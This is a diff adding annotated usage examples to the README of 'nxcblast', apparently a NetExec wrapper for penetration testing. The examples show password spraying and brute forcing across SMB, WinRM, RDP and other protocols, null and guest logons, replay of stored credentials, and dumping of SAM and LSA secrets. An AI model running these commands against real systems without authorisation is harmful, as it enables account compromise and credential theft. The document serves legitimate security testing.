@@ -41,10 +41,30 @@ Flags, defaults, and every variant: `nxcblast -h`.
 ## Examples
 
 ```bash
+# Spray one password at admin over SMB and WinRM only.
 nxcblast smb,winrm targets.txt -u admin -p 'Password1'
-nxcblast targets.txt -u admin -p 'Password1'                 # no protocols = all
-nxcblast 192.168.1.0/24 -u users.txt -p passwords.txt        # files, like nxc
+
+# Same idea, but every protocol nxcblast knows (smb, winrm, rdp, ssh, ftp, ldap, mssql, vnc, wmi).
+nxcblast targets.txt -u admin -p 'Password1'
+
+# Full anonymous / empty-creds pass: null session, empty user, and guest. Local auth is also tried on smb/winrm/wmi/rdp.
+nxcblast targets.txt --null --null-user --guest
+
+# CIDR of targets; -u/-p that are files are read automatically, same as nxc. Every user × every password.
+nxcblast 192.168.1.0/24 -u users.txt -p passwords.txt
+
+# SMB-only spray of a user list against one password, pause after 3 unique creds per target (lockout soft guard).
 nxcblast smb targets.txt -U users.txt -p 'Winter2026!' --lockout 3
+
+# Replay confirmed creds from the current nxc workspace database across every protocol.
 nxcblast all targets.txt --nxcdb
+
+# Force local SAM auth (nxc --local-auth) instead of domain, on protocols that support it.
 nxcblast smb 10.10.10.5 -u admin -p Password1 --local-auth
+
+# Anything after `--` is appended to every nxc call. Dump SAM + LSA on each SMB host in the list (needs local admin).
+nxcblast smb targets.txt -u administrator -p 'Password1' -- --sam --lsa
+
+# Same passthrough, different nxc flags: shares, users, and password policy across a couple of hosts.
+nxcblast smb 192.168.1.10 192.168.1.11 -u admin -p 'Password1' -- --shares --users --pass-pol
 ```
